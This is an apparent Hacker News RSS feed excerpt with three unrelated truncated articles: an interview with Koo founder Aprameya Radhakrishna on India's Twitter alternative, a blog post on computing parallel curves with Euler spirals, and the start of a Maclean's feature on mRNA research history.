<p>It hasn‚Äôt been a quiet few weeks on Twitter in India. The country‚Äôs capital city has seen over four months of protest after Prime Minister Narendra Modi‚Äôs government enacted agricultural laws that would adversely affect farmers across India. <a href="https://www.bbc.com/news/world-asia-india-55899754">The farmer protests</a>, as the movement has come to be known, has taken to social media platforms like Twitter and Facebook to make the cause heard globally ‚Äî and it‚Äôs worked. Earlier this month, celebrities like <a href="https://www.dw.com/en/greta-thunberg-under-fire-for-tweeting-about-indian-farmers-toolkit/a-56458306">Greta Thunberg</a> and <a href="https://www.bbc.com/news/world-asia-india-55931894">Rihanna</a> weighed in with their tweets of support. Backlash <a href="https://www.bbc.com/news/world-asia-india-55931894">soon followed</a>.&nbsp;</p>



<p>But the government‚Äôs ire against global critics of Modi‚Äôs Hindu nationalist party has turned to Twitter itself. Citing threats to public order, on February 1, Indian authorities <a href="https://www.buzzfeednews.com/article/pranavdixit/indian-government-block-critics">appeared to have requested Twitter to suspend or remove</a> dozens of accounts on its platform. Twitter briefly complied but, after public outcry, reinstated the accounts and then <a href="https://www.cjr.org/the_media_today/twitter-stands-up-to-india-and-refuses-to-block-journalists.php">refused to remove</a> hundreds more.</p>



<p>It‚Äôs in the middle of this battle that Aprameya Radhakrishna‚Äôs 10-month-old social media platform was thrust into the spotlight. Soft-spoken and studious, Radhakrishna is a serial entrepreneur: in 2015, <a href="https://economictimes.indiatimes.com/magazines/panache/taxiforsure-founder-aprameya-radhakrishnas-life-after-sell-off/articleshow/48078627.cms">he sold his first company</a>, a ride-sharing app called TaxiForSure, to local giant Ola for $200 million. His latest venture is an app called Koo, <a href="https://www.kooapp.com/">a microblogging platform similar to Twitter</a> but for local-language speakers in India, a country with more than 20 languages and over 700 dialects.&nbsp;</p>



<p>After weeks of battling with Twitter, some of India‚Äôs most prominent Hindu nationalist politicians took to their social accounts and instructed their followers to leave Western social networks for Koo, a local, free-speech platform. ‚ÄúI am now on Koo,‚Äù <a href="https://twitter.com/PiyushGoyal/status/1359058583934013442">tweeted</a> India‚Äôs minister of commerce and industry, Piyush Goyal. ‚ÄúConnect with me on this Indian micro-blogging platform for real-time, exciting and exclusive updates.‚Äù Many of his <a href="https://twitter.com/PiyushGoyal">9.6 million followers</a> obliged. More right-wing politicians <a href="https://twitter.com/rsprasad/status/1360067772571545606?s=20">followed suit</a>, as did some of <a href="https://twitter.com/KanganaTeam/status/1361421114220576768">Bollywood</a>‚Äôs biggest stars.&nbsp;</p>



<p>Overnight, the platform went from a relatively obscure app to <a href="https://timesofindia.indiatimes.com/business/india-business/koo-lines-up-indian-investors-as-popularity-surges/articleshow/80867206.cms">headline news</a> and bagged <a href="https://economictimes.indiatimes.com/tech/funding/microblogging-platform-koo-bags-4-1-million-in-funding/articleshow/80685024.cms">$4.1 million in series A funding</a>.&nbsp;</p>



<p>Radhakrishna and his platform are in a curious position. The founder insists he‚Äôs apolitical ‚Äî he‚Äôs appeared in both <a href="https://www.ndtv.com/video/news/news/koo-app-everything-you-need-to-know-about-koo-the-indian-alternative-to-twitter-575160">left-leaning</a> and <a href="https://www.opindia.com/2021/02/rahul-roushan-aprameya-radhakrishna-koo-co-founder-twitter-alternative-made-in-india-interview/">right-wing</a> outlets in the days since Koo has found the limelight ‚Äî but is happily embracing the sudden rush to his app: Koo crossed <a href="https://www.livemint.com/technology/apps/koo-sees-10-fold-increase-in-downloads-this-week-crosses-3-million-users-11613038170243.html">3 million users </a>this month, fueled in large part by Modi‚Äôs party.&nbsp;</p>



<p>And while it‚Äôs unclear whether Koo will follow in the path of other social platforms <a href="https://www.usatoday.com/story/tech/2020/11/11/parler-mewe-gab-social-media-trump-election-facebook-twitter/6232351002/">that espouse ‚Äúfree speech‚Äù ideology</a>, it‚Äôs likely more Indian apps like Radhakrishna‚Äôs will follow. Prominent among Modi‚Äôs mantras for his vision of India is <em>Atmanirbhar Bharat: </em>a self-sufficient India. That vision <a href="https://restofworld.org/2021/indias-hashtag-war/">extends to the internet and social media</a>.&nbsp;</p>



<p>Six months before prominent right-wing politicians began heralding his app as India‚Äôs Twitter, Radhakrishna and his team submitted Koo to a government <em>atmanirbhar </em>social media challenge, <a href="https://navbharattimes.indiatimes.com/business/business-news/koo-app-wins-pm-modi-aatm-nirbhar-app-innovation-challenge/articleshow/77432196.cms">and won</a>.</p>



<p>Radhakrishna spoke to <em>Rest Of World </em>over Google Meet from Bangalore. This conversation has been edited for length and clarity.</p>



<hr>



<h4><strong>Tell me a bit about how you came up with the idea for Koo.&nbsp;</strong></h4>



<p>We started building it in November 2019 and launched it in March 2020. The idea behind it was that Twitter is existing in English in India, but the language speakers of India are not on Twitter. Let‚Äôs build a deeper experience for the language speakers. And because we built a deeper experience for the language speakers, we were able to make a very localized community.&nbsp;</p>



<p>We started with Kannada, then we did Hindi, then Telugu, Marathi, then Tamil: we launched all of these languages. Then, we started noticing Twitter was getting into trouble in the U.S. We said, Maybe we should just have English as well as the local languages, if ever Twitter gets into trouble or users want a separate option.&nbsp;</p>


		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/IMG-20210218-WA0009-1-40x71.jpg" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/IMG-20210218-WA0009-1-600x1066.jpg" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/IMG-20210218-WA0009-1-400x711.jpg 400w, https://restofworld.org/wp-content/uploads/2021/02/IMG-20210218-WA0009-1-600x1067.jpg 600w, " sizes="(max-width: 640px) 100vw, 300px" alt="Aprameya Radhakrishna, a serial entrepreneur sold his first company, a ride-sharing app called TaxiForSure, for $200 million.">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				<span itemprop="copyrightHolder">Aprameya Radhakrishna</span>
			</figcaption>
		</figure>


<h4><strong>When you started Koo, how soon were you approached by government officials who saw the </strong><a href="http://www.makeinindia.com/about"><strong>‚ÄúMake in India‚Äù</strong></a><strong> potential for the app?&nbsp;</strong></h4>



<p>We were a two-month-old app when we applied to the <a href="https://innovate.mygov.in/app-challenge/">[<em>Atmanibhar Bharat</em>]</a> challenge. We got into that challenge at the last minute, almost. Nobody approached us or anything. We applied just like any other startup ‚Äî there were something like 7,000 social media startups that applied. We won that challenge, so that put us into the limelight: Oh, there‚Äôs an alternative microblogging platform that promotes local language<em>.&nbsp;</em></p>



<h4><strong>Walk me through how the last two or three weeks have been for you. Did you know that Piyush Goyal and the Ministry of Electronics and Technology would be encouraging their followers on Twitter to move to Koo en masse?&nbsp;</strong></h4>



<p>No. It‚Äôs been totally surreal for us. It‚Äôs totally welcome at Koo. We as a company are benefiting from the love that users who are shifting [from Twitter] are showing us. We weren‚Äôt expecting it, but it‚Äôs a pleasant surprise. We‚Äôre happy this move is happening.&nbsp;</p>



<h4><strong>Were you prepared for the sudden influx of users on the back end?&nbsp;</strong></h4>



<p>Not at all. Scaling 10x suddenly, in a week, is a challenge for any company, especially a 10-month-old startup. But we‚Äôve come through it; we are able to scale faster.&nbsp;</p>



<h4><strong>What were the user numbers like? Can you tell me how quickly they grew after the events of this month?&nbsp;</strong></h4>



<p>We were very small, we were sub-100,000 DAU [daily active users]. Now we‚Äôre close to a million DAU. Close, not a million yet but close.&nbsp;</p>



<h4><strong>By virtue of chance, or deliberate action, there‚Äôs an ideological framework under which Koo has been positioned. You don‚Äôt seem bothered by the fact that Koo is heralded </strong><a href="https://www.bbc.com/news/world-asia-india-56037901"><strong>as the right-wing‚Äôs answer to Twitter</strong></a><strong>. Politics has played a role in the sudden attention that Koo has received. Have you considered the risks of embracing the way your app has been politicized?&nbsp;</strong></h4>



<p>It depends on the actions on the app. That first community [we built] in Kannada was built in a slower manner, and it has people from all parties in Karnataka.&nbsp;</p>



<p>What we are seeing is that India wants to be more self-reliant. India includes everybody. Our app doesn‚Äôt understand ‚Äúleft‚Äù or ‚Äúright.‚Äù <em>I </em>don‚Äôt understand ‚Äúleft‚Äù or ‚Äúright.‚Äù I‚Äôm an entrepreneur; I‚Äôm extremely apolitical. And I‚Äôm all for the development of the country. If Koo as a statement can make us self-reliant on our own social networks and technology, then we should be cheering for it. We shouldn‚Äôt unnecessarily politicize it.</p>



<h4><strong>Social media is shaped by its users and early adopters. Most of Koo‚Äôs early video content partnerships with, say, Republic TV [a channel </strong><a href="https://www.theguardian.com/media/2020/dec/23/indian-news-channel-fined-in-uk-for-hate-speech-about-pakistan"><strong>notorious for its allegiance</strong></a><strong> with the ruling Hindu nationalist party] or Mitron [a short-form video app that Modi supporters </strong><a href="https://www.techradar.com/news/mitron-app-gives-tiktok-a-challenge-will-it-sustain-though"><strong>have embraced after the ban on TikTok</strong></a><strong>] have come to associate the app with a particular ideology. Are you worried Koo might get too polarized too quickly?&nbsp;</strong></h4>



<p>Not at all. In Karnataka, we have everybody [on Koo], as I said. As a business, we keep looking for partners to grow our business. Now, the partners who come aggressively and see the vision that we‚Äôre seeing as a free-expression platform and embrace the platform, we‚Äôre happy to welcome them. Why would I say no to somebody who wants to use our platform? Republic [TV] came first, that doesn‚Äôt mean I don‚Äôt want everybody else.&nbsp;</p>


    <figure>
      <div>
				<ul>
					<li>		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/KooPhone1-40x67.png" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/KooPhone1-600x1066.png" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/KooPhone1-400x667.png 400w, https://restofworld.org/wp-content/uploads/2021/02/KooPhone1-600x1000.png 600w, " sizes="(max-width: 640px) calc(100vw + 40px), 50vw" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure></li><li>		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/KooPhone3-40x67.png" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/KooPhone3-600x1066.png" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/KooPhone3-400x667.png 400w, https://restofworld.org/wp-content/uploads/2021/02/KooPhone3-600x1000.png 600w, " sizes="(max-width: 640px) calc(100vw + 40px), 50vw" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure></li><li>		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/KooPhone4-40x67.png" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/KooPhone4-600x1066.png" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/KooPhone4-400x667.png 400w, https://restofworld.org/wp-content/uploads/2021/02/KooPhone4-600x1000.png 600w, " sizes="(max-width: 640px) calc(100vw + 40px), 50vw" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure></li><li>		<figure>
			<div>
				<p><img src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/KooPhone2-40x67.png" data-src="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/KooPhone2-600x1066.png" data-srcset="https://149346090.v2.pressablecdn.com/wp-content/uploads/2021/02/KooPhone2-400x667.png 400w, https://restofworld.org/wp-content/uploads/2021/02/KooPhone2-600x1000.png 600w, " sizes="(max-width: 640px) calc(100vw + 40px), 50vw" alt="">
					
				</p>
			</div>
						<figcaption itemprop="caption description">
				
				
			</figcaption>
		</figure></li>
				</ul>
			</div>
      <figcaption>On Koo‚Äôs Hindi language setting, it‚Äôs easy to find the accounts of several of India‚Äôs biggest Hindu nationalist politicians next to celebrities and right-leaning media channels. The majority of the app‚Äôs top trending hashtags in Hindi are pro-Modi.</figcaption>
    </figure>


<h4><strong>In a recent BBC report about your app, there‚Äôs a rhetorical question, </strong><a href="https://www.bbc.com/news/world-asia-india-56037901"><strong>‚ÄúIs Koo India‚Äôs Parler?‚Äù</strong></a><strong> What do you make of that comparison?&nbsp;</strong></h4>



<p>Each platform comes into being for different reasons. I‚Äôve already explained my story. We were doing this irrespective of whether Twitter existed, got banned, got into trouble, or flourished in India.&nbsp;</p>



<p>We started in November 2019 because we said the voice of the Indian user who doesn‚Äôt speak English is not there. We are building an inclusive social media network for India. So what was your question?&nbsp;</p>



<h4><strong>My question was what do you make of Parler and‚Äî</strong></h4>



<p>Parler came into existence because there was an anti-Trump thing, and they wanted to do a pro-Trump thing. We don‚Äôt exist because of some anti or pro thing. We are existing today irrespective of whether Twitter gets into trouble or not, irrespective of one ideology being there or not. We exist because we want to give a voice to every Indian. The purpose of our existence is very different from what a Parler is.&nbsp;</p>



<h4><strong>What do you make of the ‚ÄúMake in India‚Äù push, considering Facebook and Twitter have </strong><a href="https://www.nytimes.com/2021/01/14/technology/trump-facebook-twitter.html"><strong>an undeniable influence</strong></a><strong> in our current political discourse?</strong></h4>



<p>Every social media [platform] has to be responsible, to a certain extent, of what they bring into a country because it defines a lot of things in the country, like youth culture or how citizens of a country react to a situation.&nbsp;</p>



<p>When a company is registered elsewhere and doesn‚Äôt take into consideration the nuances of the local culture, I think it can be dangerous. Indian entrepreneurs building for Indian cultural nuances is better than somebody who doesn‚Äôt understand the cultural nuances trying to build for India.</p>



<figure><blockquote><p>‚ÄúIndian entrepreneurs building for Indian cultural nuances is better than somebody who doesn‚Äôt understand the cultural nuances trying to build for India.‚Äù</p></blockquote></figure>



<h4><strong>The way Indian internet is shaping, </strong><a href="https://restofworld.org/2021/indias-hashtag-war/"><strong>an extreme version of ‚ÄúIndian apps for India‚Äù</strong></a><strong> is an entire separate internet for India, the way China has Weibo and its own social network. Do you think that kind of internet would be a good thing for India as a whole?&nbsp;</strong></h4>



<p>Absolutely, we should have our own <em>atmanirbhar</em> platforms. We ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://restofworld.org/2021/how-koo-became-a-right-wing-darling-in-india/">https://restofworld.org/2021/how-koo-became-a-right-wing-darling-in-india/</a></em></p>]]>
            </description>
            <link>https://restofworld.org/2021/how-koo-became-a-right-wing-darling-in-india/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26196588</guid>
            <pubDate>Fri, 19 Feb 2021 18:58:32 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cleaner parallel curves with Euler spirals]]>
            </title>
            <description>
<![CDATA[
Score 124 | Comments 12 (<a href="https://news.ycombinator.com/item?id=26196470">thread link</a>) | @raphlinus
<br/>
February 19, 2021 | https://raphlinus.github.io/curves/2021/02/19/parallel-curves.html | <a href="https://web.archive.org/web/*/https://raphlinus.github.io/curves/2021/02/19/parallel-curves.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <!-- I should figure out a cleaner way to do this include, rather than cutting and pasting. Ah well.-->




<p><img src="https://raphlinus.github.io/assets/euler-parallel-flower.svg" alt="Many parallel curve of an Euler spiral, resembling a flower"></p>

<p>Determining <a href="https://en.wikipedia.org/wiki/Parallel_curve">parallel curves</a> is one of the basic 2D geometry operations. It has obvious applications in graphics, being the basis of creating a stroke outline from a path, but also in computer aided manufacturing (determining the path of a milling tool with finite radius) and path planning for robotics. There are plenty of solutions in the literature by now, but in this post I propose a cleaner solution.</p>

<p>A good survey paper is <a href="https://www.semanticscholar.org/paper/Comparing-Offset-Curve-Approximation-Methods-Elber-Lee/9ac1978746ec54bdd555b906e2ea1eb922cd6ffd">Comparing Offset Curve Approximation Methods</a>. The main difference between these approaches is the choice of curve representation. An example of a curve representation highly specialized for deriving parallel curves is the <a href="https://www.semanticscholar.org/paper/Pythagorean-hodographs-Farouki-Sakkalis/e20aeb60de908061797b6eaf3af79fdc7e5acdd7">Pythagorean Hodograph</a>. This parallel curve of a Pythagorean Hodograph is an exact parametric polynomial curve, but approximation techniques are still needed in practice, both to convert the source curve into the representation, and because the resulting curves are higher order rational polynomials, which require further approximation to convert into, say, cubic B√©ziers.</p>

<p>Specifically, this blog proposes piecewise Euler spirals as a curve representation particularly well suited to the parallel curve problem.</p>

<p>There‚Äôs an implementation of many of these ideas (currently still in PR stage) in <a href="https://github.com/linebender/kurbo/pull/169">kurbo</a>. I also used a colab notebook to explore a bunch of the math, and I‚Äôve made a <a href="https://github.com/raphlinus/raphlinus.github.io/blob/master/assets/Euler_spiral_scratchpad.ipynb">copy of that available</a> as well.</p>

<h2 id="the-cusp">The cusp</h2>

<p>One of the things that makes parallel curves special is that cusps often appear. In particular, a cusp appears whenever the radius of curvature of the source curve matches the offset. This is classified as an <a href="https://en.wikipedia.org/wiki/Cusp_(singularity)">ordinary cusp</a> and is a feature of many curve families ‚Äì we‚Äôll quantify that a bit more below.</p>

<p><img src="https://raphlinus.github.io/assets/euler-parallel-cusp.svg" alt="Parallel curve of an Euler spiral, showing the cusp"></p>

<p>A common feature of algorithms for computing parallel curves is identifying the location of the cusp, and subdividing there. That basically means solving for the specific value of curvature (the reciprocal of the offset distance). If the source curve is a cubic B√©zier, there can be up to four such cusps, and finding them requires some nontrivial numerical solving.</p>

<h2 id="curvature-as-a-function-of-arclength">Curvature as a function of arclength</h2>

<p>A theme of my approach to parallel curves (and much of my curve work in general, including my <a href="https://www.levien.com/phd/phd.html">thesis</a>), is to consider the relationship of curvature to arclength. A concrete intuition is that it is the position of the steering wheel as a car drives along the curve at constant speed. For some curves, curvature can be represented as a closed-form analytical formula as a function of arclength (the <a href="https://en.wikipedia.org/wiki/Ces%C3%A0ro_equation">Ces√†ro equation</a>), but in general determining the relation requires numerical techniques. For example, in the <a href="https://levien.com/euler_explorer/">Euler explorer</a>, there‚Äôs a plot of curvature as a function of arclength below the interactive cubic B√©zier. Experimenting with that is an excellent way to develop intuition.</p>

<p>One curve that <em>does</em> have an especially simple Ces√†ro equation is the Euler spiral. An Euler spiral segment has this formula:</p><p>

\[\kappa(s) = \kappa_0 + \kappa_1 s\]

</p><p>(A note for those trying to follow along with the detailed math and code: most of the math and numerical code uses $-0.5 \leq s \leq 0.5$ because it helps exploit even/odd symmetries, but the convention for parametrized curves, including the <a href="https://docs.rs/kurbo/0.8.0/kurbo/trait.ParamCurve.html">ParamCurve</a> trait in kurbo, is $0 \leq s \leq 1$. Thus, you‚Äôll frequently see offsets of 0.5. Similarly, you‚Äôll see various scaling to the actual arc length, while the parametrized curve convention assumes an arc length of 1. In this blog, we‚Äôll skim over such details, as the goal is to provide intuition without too much clutter from details.)</p>

<h2 id="the-parallel-curve-of-an-euler-spiral">The parallel curve of an Euler spiral</h2>

<p>In general, most curves do not have a simple formula for their parallel curve. The obvious exception is a circular arc, for which the parallel curve is another circular arc. Another curve family with tractable representation for its parallel curve is Pythagorean Hodographs.</p>

<p>Thanks to its exceptionally simple formulation as a Ces√†ro equation, the Euler spiral is one of the rare curves with a simple closed-form equation for its parallel curve. That equation was first published in a 1906 paper by Heinrich Wieleitner, <a href="https://books.google.com/books?id=UvpZAAAAYAAJ&amp;pg=PA373&amp;lpg=PA373&amp;dq=%22Die+Parallelkurve+der+Klothoide%22&amp;source=bl&amp;ots=fuY39VdPpd&amp;sig=K0AbL03rXAm_g4J9KsheQbbxyaA&amp;hl=en&amp;sa=X&amp;ved=2ahUKEwiUrcD1poTfAhVvFjQIHVthBPoQ6AEwAnoECAMQAQ#v=onepage&amp;q=%22Die%20Parallelkurve%20der%20Klothoide%22&amp;f=false">Die Parallelkurve der Klothoide</a>. For those who don‚Äôt read German, <a href="https://github.com/Rahix">Rahix</a> has kindly provided a translation into English: <a href="https://raphlinus.github.io/assets/clothoids.pdf">PDF</a>, <a href="https://raphlinus.github.io/assets/clothoids.text">TeX source</a>.</p>

<p>Going over this math, I see Wieleitner missed an opportunity for further simplification. The style at the time was to write the Ces√†ro equation in terms of the <em>radius</em> of curvature (the reciprocal of curvature), but especially for the Euler spiral and its parallel curve, using curvature directly yields a much simpler equation. With the cusp located at $s_0$, the equation is gratifyingly simple:</p><p>

\[\kappa(s) = \frac{c}{\sqrt{s - s_0}} + \frac{1}{l}\]

</p><p>The equation is graphed below, and clicking on it links to a <a href="https://www.desmos.com/calculator/qznzk9xnac">Desmos calculator graph</a> with sliders for the parameters.</p>

<p><a href="https://www.desmos.com/calculator/qznzk9xnac"><img src="https://raphlinus.github.io/assets/euler-spiral-parallel-cesaro.png" width="400" height="400"></a></p>

<p>Here $c$ is a coefficient dependent on the parameters of the spiral. To connect it to the notation in the Wieleitner paper, $c = a / \sqrt{2 l^3}$, and $s_0 = -a^2/{2l}$. I‚Äôve also made a <a href="https://www.desmos.com/calculator/imvqywsb8o">Desmos calculator graph</a> that interactively demonstrates the equivalence of this equation and the more involved one from the Wieleitner paper.</p>

<p>There are a number of other curves that have a cusp similar to the above, with characteristic inverse-square root curvature. The clearest connection is the <a href="https://en.wikipedia.org/wiki/Involute">circle involute</a>, which is the same but without the $1/l$ term, or in other words the Euler spiral parallel curve approaches the circle involute as the offset goes to infinity. This provides intuition for the fact that a circle involute is its own parallel curve. The circle involute is perhaps most famous as the optimized profile for meshing <a href="https://ciechanow.ski/gears/">gear</a> teeth, transferring force smoothly with no slop or friction.</p>

<p>Other curves with a similar cusp include the <a href="https://en.wikipedia.org/wiki/Cycloid">cycloid</a> (as well as its many variants including epicycloid, hypocycloid, astroid, deltoid, cardioid, and nephroid), as well as the <a href="https://en.wikipedia.org/wiki/Semicubical_parabola">semicubical parabola</a>. The latter is of particular interest because it can be exactly represented as a case of a cubic B√©zier (it is when the control arms form a symmetrical X).</p>

<p><img src="https://raphlinus.github.io/assets/semicubical_parabola.svg" alt="semicubical parabola"></p>

<p>The parallel curve of the Euler spiral is perfectly cromulent, and, following the tradition of Pythagorean Hodograph curves and their higher-order rational polynomials, we could simply require everything downstream to simply deal with them. But to make that downstream processing easier, we will convert back to piecewise Euler spirals, a more tractable representation.</p>

<h2 id="geometric-hermite-interpolation">Geometric Hermite interpolation</h2>

<p><a href="https://en.wikipedia.org/wiki/Hermite_interpolation">Hermite interpolation</a> is a well known technique. In its simplest form, it is used to generate a piecewise polynomial approximation to some function, where the parameters for each polynomial segment are determined from the values and derivatives of the endpoints. For example, in cubic Hermite interpolation, a cubic polynomial is determined from the values and first derivatives at the endpoints ‚Äì four values, corresponding to four coefficients for the polynomial. The result is C1 continuous as the derivatives exactly match (and are equal to the source curve).</p>

<p>In 2D, there is a distinction between C1 and G1 (geometric) continuity. In C1 continuity, the full derivatives must match, both direction and magnitude. For applications such as animating motion curves, the magnitude is important (it represents speed of motion), but for curves, it is not. G1 continuity requires that the tangents match, but does not specify the magnitude of the derivatives.</p>

<p>In these applications, geometric Hermite interpolation is more efficient, as all parameters of the curve are available to make the shape fit. The Euler spiral is especially well suited to geometric Hermite interpolation, and there is literature on this topic. For reasonable assumptions of smoothness (excluding fractal curves but including simple cusps), the accuracy scales as $O(n^4)$ ‚Äì a doubling of the number of subdivisions reduces the error by a factor of 16. This scaling is the same as cubic Hermite interpolation of a 1D function, not surprising as an Euler spiral segment approximates a cubic polynomial when $y$ values are small.</p>

<p>Section 8.2 of my <a href="https://www.levien.com/phd/phd.html">thesis</a> provides a secant method for determining the Euler spiral parameters from the G1 Hermite constraints, and that‚Äôs implemented in the <code>fit_euler</code> method in the <a href="https://github.com/linebender/kurbo/pull/169">kurbo PR</a>. That‚Äôs a good technique and its convergence is excellent (quadratic, as typical for Newton-style solvers for near-linear problems), but I‚Äôve also been experimenting with ways to do it better. The linked notebook explores a polynomial approximation (based on 2D Taylor‚Äôs series) that is much faster ‚Äì 7ns vs 240ns in my measurements, and should be very accurate over a wide range of parameters. I‚Äôm not quite done making the error bounds rigorous, but this approach should help make the overall algorithm lightning-fast.</p>

<p>Geometric Hermite interpolation works well to approximate the parallel curve of an Euler spiral segment with another Euler spiral segment:</p>

<p><img src="https://raphlinus.github.io/assets/euler-parallel-approx.svg" alt="Approximation of the parallel curve of an Euler spiral segment"></p>

<p>The true parallel curve is in blue, and the approximation in red. It has the same rough shape, but bulges out in the middle. We need to be able to estimate that error in order to make a more accurate approximation.</p>

<h3 id="a-simple-accurate-error-metric">A simple, accurate error metric</h3>

<p>The most common approach to approximation given a target error bound is adaptive subdivision: approximate the error, and if it exceeds the target, subdivide. Evaluating the error is not always easy; most generally, it‚Äôs based on numerical techniques such as evaluating the curve at several points along its length and testing how near those points lie to the source curve.</p>

<p>Fortunately, for approximating an Euler spiral parallel curve using an Euler spiral, there is an extremely simple formula for the error. In fact, it‚Äôs possible to avoid the adaptive subdivision altogether, and precisely predict how many subdivisions are needed to meet an error bound, as well as analytically place the subdivisions so each segment has the same error.</p>

<p>Normalized to a chord length of 1, where the arc ‚Ä¶</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://raphlinus.github.io/curves/2021/02/19/parallel-curves.html">https://raphlinus.github.io/curves/2021/02/19/parallel-curves.html</a></em></p>]]>
            </description>
            <link>https://raphlinus.github.io/curves/2021/02/19/parallel-curves.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26196470</guid>
            <pubDate>Fri, 19 Feb 2021 18:49:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Researchers looking for mRNA were ridiculed by colleagues]]>
            </title>
            <description>
<![CDATA[
Score 292 | Comments 99 (<a href="https://news.ycombinator.com/item?id=26196372">thread link</a>) | @fortran77
<br/>
February 19, 2021 | https://www.macleans.ca/society/science/scientists-mrna-covid-vaccines/ | <a href="https://web.archive.org/web/*/https://www.macleans.ca/society/science/scientists-mrna-covid-vaccines/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Sixty years ago, the scientists who were pioneering the technology that would make today's COVID-19 vaccines possible were mocked and dismissed</p><div>
																		<p>A few days before Christmas, Matthew Meselson, a 90-year-old professor at Harvard, called his university‚Äôs health service to inquire about being vaccinated against COVID-19. He was eager for his shot. Meselson felt imprisoned in his Cambridge apartment, just blocks from the campus where he‚Äôd worked for six decades. He‚Äôd officially retired from teaching at the beginning of 2020, but continued his research as much as possible throughout the pandemic, wearing a K95 mask to work in his lab.</p>
<p>He longed to re-engage in the world around him. He missed his weekly date with close friends over lunch at Boston‚Äôs best French restaurant; they‚Äôd switched to Zoom, but staring into a computer screen is no replacement for lingering at linen-covered tables. He longed for his wife of 32 years, Jeanne Guillemin, who died from cancer late in 2019. Meselson was still figuring out how his world worked without her, and isolation made this hard task harder.</p>
<p>The person on the other end of the phone apologized to the professor. ‚ÄúWe don‚Äôt have a vaccine schedule yet,‚Äù she told him.</p>
<p>The first two COVID-19 vaccines to be approved for use in North America were developed, tested and delivered into freezers before many jurisdictions figured out how to administer them. The vaccines from Pfizer-BioNTech and Moderna are the first approved vaccines ever to employ modified mRNA, which is delivered sealed in a lipid shell. The mRNA slips into our cells, carrying instructions to make antibodies that target SARS-CoV-2. The vaccines function almost like a wanted poster: if you see these guys, get ‚Äôem. Then, the mRNA degrades, leaving no trace.</p>
<blockquote><p><strong>READ:&nbsp;<a href="https://www.macleans.ca/news/covid-19-vaccines-curbing-pandemic-vaxx-populi/">How quickly will the COVID-19 vaccines start curbing the pandemic in Canada?</a></strong></p></blockquote>
<p>The fact that mRNA is the basis of these vaccines contributed to their rapid development. In November, the <em>New York Times</em> reported that within two days of China releasing the genetic sequence of SARS-CoV-2, scientists at Moderna Inc., a 10-year-old company headquartered not far from Meselson‚Äôs home in Cambridge, ‚Äúplugged that data into its computers and came up with a design for an mRNA vaccine.‚Äù Meanwhile, BioNTech, a small biotech company in Germany that had been working on mRNA flu vaccines with the pharmaceutical powerhouse Pfizer, soon similarly turned its resources to generating an mRNA COVID vaccine.</p>
<p>But these fastest vaccines in history have been decades in the making. They‚Äôre the product of generations of scientists who built on one idea after another, and kept at it despite failed experiments, rejections, threats of deportation, a lack of funding and skepticism from contemporaries. They were inspired by the discovery of DNA: in 1951, a young English physical chemist named Rosalind Franklin took X-ray photographs that captured DNA‚Äôs helical shape; two years later, James Watson and Francis Crick of Cambridge University published the first report describing DNA‚Äôs double helix, for which they received the Nobel Prize. (Franklin died of ovarian cancer in 1958; her contributions were largely overlooked in her lifetime.) And they were driven not by a race to halt a raging pathogen or by the chance to patent a multi-billion-dollar drug, but by one big, irresistible question: What makes life?</p>
<p>‚ÄúThese weren‚Äôt people who wanted to solve little problems,‚Äù says Meselson. ‚ÄúThese were people who wanted to solve a great big problem.‚Äù</p>
<p>He was one of them.</p>
<p>***</p>
<p>Born in Colorado in 1930, Meselson zipped through the sciences at a young age. By 16, he enrolled at the University of Chicago. In 1957, while doing post-doctoral work at the California Institute of Technology (Caltech), Meselson and Frank Stahl demonstrated how DNA replicates itself, a model that had been suggested but never shown. Science historian Frederic Lawrence Holmes later characterized their work as ‚Äúthe most beautiful experiment in biology,‚Äù having revealed how life worked.</p>
<p>But many unanswered questions remained about what happens inside our cells. Meselson and colleagues knew that DNA resides in the nucleus, a compartment barricaded off from the rest of the cell by a membrane. On the other side of the membrane is the cytoplasm, a gelatinous liquid that fills the remainder of the cell. This is the home of tiny granules called ribosomes, which house RNA.</p>
<p>Around the same time that Meselson and Stahl published their groundbreaking work on DNA, French scientists discovered that cells made proteins through the ribosomes. DNA, despite holding the critical codes for life, is a relatively passive molecule. Ribosomes do the busy labour, building proteins to carry out the biological processes of survival. The question was how?</p>
<p>One of the French scientists, Dr. Fran√ßois Jacob, theorized that there must be an ‚Äúunstable intermediary‚Äù that went between the DNA and the RNA‚Äîsending messages from the DNA to the RNA, and then disappearing.</p>
